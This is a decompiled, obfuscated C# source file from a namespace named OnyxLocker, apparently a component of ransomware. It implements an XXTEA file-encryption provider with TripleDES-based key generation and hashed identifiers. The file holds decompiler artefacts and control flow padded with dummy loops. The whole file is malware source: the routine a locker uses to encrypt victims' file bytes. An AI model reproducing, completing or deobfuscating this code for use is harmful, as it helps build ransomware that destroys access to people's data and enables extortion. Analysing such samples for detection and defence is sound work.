using System;
using System.Security.Cryptography;
using System.Text;
using A;

namespace OnyxLocker.Classes;

internal class XxteaEncryptionProvider : IEncryptionProvider
{
	private readonly UTF8Encoding utf8 = new UTF8Encoding();

	private const uint delta = 2654435769u;

	private byte[] EncryptionKey { get; set; }

	public byte[] CreateEncryptionKey()
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.KeySize = 192;
		tripleDESCryptoServiceProvider.GenerateKey();
		byte[] key = tripleDESCryptoServiceProvider.Key;
		tripleDESCryptoServiceProvider.Dispose();
		cc6b2c88c51c3633da50f71cff598c726.c757cc4db113ae43c821f8f25a1fa333e(this, key);
		return key;
	}

	public byte[] GetEncryptionKey()
	{
		return c9a2a74234d2906f2471606addc1484bb.c757cc4db113ae43c821f8f25a1fa333e(this);
	}

	public byte[] EncryptBytes(byte[] fileBytes, byte[] encryptionKey)
	{
		try
		{
			return cd7d7495fb16b0337faef8683380a0b78.c757cc4db113ae43c821f8f25a1fa333e(this, fileBytes, encryptionKey);
		}
		catch
		{
			return c92036b1e8dbd33aab7c09674399d72a9.c4c861d4efd44af19cd76b16a2c024c47;
		}
	}

	private uint MX(uint sum, uint y, uint z, int p, uint e, uint[] k)
	{
		return (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((sum ^ y) + (k[(p & 3) ^ e] ^ z));
	}

	private byte[] Encrypt(byte[] data, byte[] key)
	{
		if (ca65c669ad629a98cbb942b6119fff32b.c8d798c339232c1b6b575ebd272b15269(data) == (UIntPtr)(nuint)0u)
		{
			while (true)
			{
				switch (5)
				{
				case 0:
					break;
				default:
					if (1 == 0)
					{
						/*OpCode not supported: LdMemberToken*/;
					}
					return data;
				}
			}
		}
		return ca5c5bc4c60b7bd5547327736231bb171.c757cc4db113ae43c821f8f25a1fa333e(this, c809b7891be34a395e2449f4493b20e18.c757cc4db113ae43c821f8f25a1fa333e(this, c22accc5257533858df564779d094eaf6.c757cc4db113ae43c821f8f25a1fa333e(this, data, c0ee820f9096a58514c56127bd2839ec8: true), c22accc5257533858df564779d094eaf6.c757cc4db113ae43c821f8f25a1fa333e(this, c9edba9cda58df8c70a87519c8e901612.c757cc4db113ae43c821f8f25a1fa333e(this, key), c0ee820f9096a58514c56127bd2839ec8: false)), c0ee820f9096a58514c56127bd2839ec8: false);
	}

	private uint[] Encrypt(uint[] v, uint[] k)
	{
		int num = (int)(nuint)ca6d7bf5515c27ecfc2b0c0a8659fc5d5.c8d798c339232c1b6b575ebd272b15269(v) - 1;
		if (num < 1)
		{
			while (true)
			{
				switch (3)
				{
				case 0:
					break;
				default:
					if (1 == 0)
					{
						/*OpCode not supported: LdMemberToken*/;
					}
					return v;
				}
			}
		}
		uint cb154a4481e21dd0b69fd5fd35d2b = v[num];
		uint num2 = 0u;
		int num3 = 6 + 52 / (num + 1);
		while (0 < num3--)
		{
			num2 += 2654435769u;
			uint ce137510aaa3fd3dd7730d159e30daf = (num2 >> 2) & 3u;
			int i;
			uint caa83236fc3b860b74f78d83bcc425f;
			for (i = 0; i < num; i++)
			{
				caa83236fc3b860b74f78d83bcc425f = v[i + 1];
				cb154a4481e21dd0b69fd5fd35d2b = (v[i] += ccc8748317815861ac186b57f3d7abe36.c757cc4db113ae43c821f8f25a1fa333e(this, num2, caa83236fc3b860b74f78d83bcc425f, cb154a4481e21dd0b69fd5fd35d2b, i, ce137510aaa3fd3dd7730d159e30daf, k));
			}
			while (true)
			{
				switch (2)
				{
				case 0:
					break;
				default:
					goto end_IL_007f;
				}
				continue;
				end_IL_007f:
				break;
			}
			caa83236fc3b860b74f78d83bcc425f = v[0];
			cb154a4481e21dd0b69fd5fd35d2b = (v[num] += ccc8748317815861ac186b57f3d7abe36.c757cc4db113ae43c821f8f25a1fa333e(this, num2, caa83236fc3b860b74f78d83bcc425f, cb154a4481e21dd0b69fd5fd35d2b, i, ce137510aaa3fd3dd7730d159e30daf, k));
		}
		while (true)
		{
			switch (7)
			{
			case 0:
				continue;
			}
			return v;
		}
	}

	private byte[] FixKey(byte[] key)
	{
		if ((int)(nuint)ca65c669ad629a98cbb942b6119fff32b.c8d798c339232c1b6b575ebd272b15269(key) == 16)
		{
			return key;
		}
		byte[] array = c8232485a67170edd7f299aa0b838f6d5.c7cb1f716b787714951ca7b99e7c9eec5(16);
		if ((int)(nuint)ca65c669ad629a98cbb942b6119fff32b.c8d798c339232c1b6b575ebd272b15269(key) < 16)
		{
			while (true)
			{
				switch (7)
				{
				case 0:
					continue;
				}
				break;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			key.CopyTo(array, 0);
		}
		else
		{
			Array.Copy(key, 0, array, 0, 16);
		}
		return array;
	}

	private uint[] ToUInt32Array(byte[] data, bool includeLength)
	{
		int num = (int)(nuint)ca65c669ad629a98cbb942b6119fff32b.c8d798c339232c1b6b575ebd272b15269(data);
		int num2 = (((num & 3) == 0) ? (num >> 2) : ((num >> 2) + 1));
		uint[] array;
		if (includeLength)
		{
			array = c0cccb8b7285fb7714a3e9a8124aa4397.c7cb1f716b787714951ca7b99e7c9eec5(num2 + 1);
			array[num2] = (uint)num;
		}
		else
		{
			array = c0cccb8b7285fb7714a3e9a8124aa4397.c7cb1f716b787714951ca7b99e7c9eec5(num2);
		}
		for (int i = 0; i < num; i++)
		{
			array[i >> 2] |= (uint)(data[i] << ((i & 3) << 3));
		}
		return array;
	}

	private byte[] ToByteArray(uint[] data, bool includeLength)
	{
		int num = (int)(nuint)ca6d7bf5515c27ecfc2b0c0a8659fc5d5.c8d798c339232c1b6b575ebd272b15269(data) << 2;
		if (includeLength)
		{
			while (true)
			{
				switch (1)
				{
				case 0:
					continue;
				}
				break;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			int num2 = (int)data[(int)(nuint)ca6d7bf5515c27ecfc2b0c0a8659fc5d5.c8d798c339232c1b6b575ebd272b15269(data) - 1];
			num -= 4;
			if (num2 >= num - 3)
			{
				while (true)
				{
					switch (2)
					{
					case 0:
						continue;
					}
					break;
				}
				if (num2 <= num)
				{
					num = num2;
					goto IL_004c;
				}
			}
			return null;
		}
		goto IL_004c;
		IL_004c:
		byte[] array = c8232485a67170edd7f299aa0b838f6d5.c7cb1f716b787714951ca7b99e7c9eec5(num);
		for (int i = 0; i < num; i++)
		{
			array[i] = (byte)(data[i >> 2] >> ((i & 3) << 3));
		}
		while (true)
		{
			switch (7)
			{
			case 0:
				continue;
			}
			return array;
		}
	}
}
